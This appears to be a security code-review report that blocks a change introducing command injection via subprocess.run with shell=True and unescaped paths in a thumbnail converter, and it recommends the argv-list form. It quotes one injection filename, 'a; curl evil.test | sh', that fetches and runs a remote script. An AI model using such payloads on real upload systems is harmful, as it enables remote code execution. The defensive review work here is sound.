findings.body:
`subprocess.run(..., shell=True)` with an f-string that embeds `upload_dir`, `name`, and `oid` lets those values be interpreted by the shell. A filename such as `a; curl evil.test | sh` (or any value with `;`, `|`, `$()`, backticks, spaces) executes arbitrary commands as the converter user and can overwrite paths outside `/srv/thumbs/`.

The previous argv-list form (`["/usr/bin/convert", src, dst]`) avoided this entirely. Restore `shell=False` and a fixed executable path; address any ImageMagick 7 policy/delegate need in IM config rather than by shelling out. If a shell is unavoidable, every dynamic segment must be escaped (e.g. `shlex.quote`) — argv-list remains the correct default.

```suggestion
        ["/usr/bin/convert", f"{upload_dir}/{name}", f"/srv/thumbs/{oid}.png"],
        # do not use shell=True — paths are attacker-influenced
```

The command switched from `/usr/bin/convert` to bare `convert`, so the shell resolves the binary via `PATH`. On a shared or compromised runner that can put another `convert` earlier in `PATH`, thumbnail generation runs attacker-controlled code.

Keep an absolute path to the ImageMagick binary (IM7 often uses `/usr/bin/magick` rather than `convert`) when restoring the argv-list form.

summary:
## Verdict

**Do not merge** — this change introduces a command-injection vulnerability by switching thumbnail conversion from argv-list `subprocess.run` to `shell=True` with unescaped interpolation of `upload_dir`, `name`, and `oid`.

## Why this is blocking

The previous form passed each argument as a separate argv element to `/usr/bin/convert`, so shell metacharacters in filenames could not alter the command. The new form builds a single shell string:

```python
f"convert {upload_dir}/{name} /srv/thumbs/{oid}.png"
```

Any value containing spaces, `;`, `|`, `$()`, backticks, or similar is interpreted by the shell. A crafted upload name (or `upload_dir` / `oid`) can run arbitrary commands as the process user and write outside `/srv/thumbs/`.

The removed comment claimed upstream `ALLOWED_FILES` validation for `name` only. Even if that regex still exists elsewhere, `upload_dir` and `oid` were never covered by that note, and shell quoting is still required when using `shell=True`. Validation is also easy to regress; argv-list form does not depend on it.

## Safer direction for IM7

If ImageMagick 7 needs a policy/delegate adjustment, keep the argv-list form (or `shell=False` with a fixed executable path) and fix the IM policy/delegate configuration separately. If a shell wrapper is truly unavoidable, pass a static command string and feed paths via a mechanism that does not interpolate into the shell (or use `shlex.quote` on every dynamic segment — still weaker than argv-list).

**Recommendation:** request-changes

verification.reason: The change replaces a safe argv-list `subprocess.run` with `shell=True` and an f-string embedding `upload_dir`, `name`, and `oid` unescaped, so shell metacharacters in those values execute as the converter user. No upstream validation remains in-repo; severity critical is appropriate.
